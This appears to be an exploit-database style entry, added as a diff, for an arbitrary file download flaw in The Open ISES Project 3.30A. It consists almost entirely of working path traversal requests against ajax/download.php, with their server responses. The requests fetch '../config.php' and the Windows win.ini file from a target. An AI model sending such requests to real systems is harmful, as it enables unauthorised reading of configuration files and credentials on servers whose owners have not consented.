@@ -1,0 +1,56 @@
+# Exploit Title: The Open ISES Project 3.30A - Arbitrary File Download
+# Dork: N/A
+# Date: 2018-10-18
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: http://openises.sourceforge.net/
+# Software Link: https://sourceforge.net/projects/openises/files/latest/download
+# Version: 3.30A_050318
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/ajax/download.php?filename=[FILE]&origname=&type=
+
+GET /[PATH]/ajax/download.php?filename=../config.php&origname=&type= HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=pfdl1njr8uei6v7n3euoejuta7
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 18 Oct 2018 17:20:09 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Disposition: attachment; filename="";
+Content-Transfer-Encoding: binary
+Pragma: public
+Cache-Control: must-revalidate, post-check=0, pre-check=0
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: {$filetype}
+
+GET /[PATH]/ajax/download.php?filename=../../../../../Windows/win.ini&origname=&type= HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Cookie: PHPSESSID=pfdl1njr8uei6v7n3euoejuta7
+Connection: keep-alive
+HTTP/1.1 200 OK
+Date: Thu, 18 Oct 2018 17:23:53 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Disposition: attachment; filename="";
+Content-Transfer-Encoding: binary
+Pragma: public
+Cache-Control: must-revalidate, post-check=0, pre-check=0
+Content-Length: 564
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: {$filetype}
